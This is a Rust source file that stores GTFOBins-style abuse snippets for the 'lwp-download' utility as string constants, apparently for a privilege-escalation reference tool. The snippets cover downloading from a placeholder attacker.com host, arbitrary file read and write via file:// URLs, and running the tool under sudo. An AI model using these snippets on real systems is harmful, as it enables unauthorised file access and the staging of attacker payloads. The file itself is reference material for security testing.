pub static BIN_NAME: &'static str = "lwp-download";
pub static BIN_DESCRIPTION: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    lwp-download $URL $LFILE
"#;
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    TF=$(mktemp)
    echo DATA >$TF
    lwp-download file://$TF $LFILE
"#;
pub static FR_DESC: &'static str = "The file path is absolute.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    TF=$(mktemp)
    lwp-download "file://$LFILE" $TF
    cat $TF
"#;
pub static SUDO_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    sudo lwp-download $URL $LFILE
"#;
use crate::code::{Code, Tag};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
